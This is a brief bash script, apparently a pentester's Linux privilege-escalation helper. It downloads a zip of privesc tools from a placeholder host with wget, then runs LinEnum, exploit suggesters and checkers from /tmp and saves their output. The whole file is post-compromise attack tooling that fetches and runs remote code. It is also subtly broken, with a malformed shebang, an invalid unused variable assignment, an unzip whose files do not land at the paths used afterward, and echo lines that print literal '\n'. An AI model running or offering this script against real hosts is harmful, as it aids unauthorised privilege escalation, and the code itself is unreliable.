#/bin/bash

path_to_zip = $1

echo "Basic information"
UNAME="$(uname -a)"
RELEASE="$(lsb_release -a)"

echo "uname -a: ${UNAME}\n"
echo "release: ${RELEASE}\n"

echo "--------------------------\n\n"


echo "Getting the privesc-scripts and saving them in /tmp/ \n"
wget http://x.x.x.x/privesc/lin_privesc.zip -O /tmp/privesc.zip

echo "Unzipping privesc.zip\n"
unzip /tmp/privesc.zip
mkdir /tmp/privesc/out/

echo "Running LinEnum\n"
bash /tmp/privesc/LinEnum.sh > /tmp/privesc/out/LinEnum.txt

echo "Running linexpchecker\n"
python /tmp/privesc/linexpchecker.py > /tmp/privesc/out/linexpchecker.txt

echo "Running linexpsuggester\n"
perl /tmp/privesc/linexpsuggester.pl > /tmp/privesc/out/linexpsuggester.txt

echo "Running linprivchecker\n"
python /tmp/privesc/linprivchecker.py > /tmp/privesc/out/linprivchecker.txt

echo "Running unix-privesc-check\n"
chmod +x /tmp/privesc/unix-privesc-check && bash /tmp/privesc/unix-privesc-check > /tmp/privesc/out/unix-privesc-check.txt

echo "DONE!\n\n---------------"
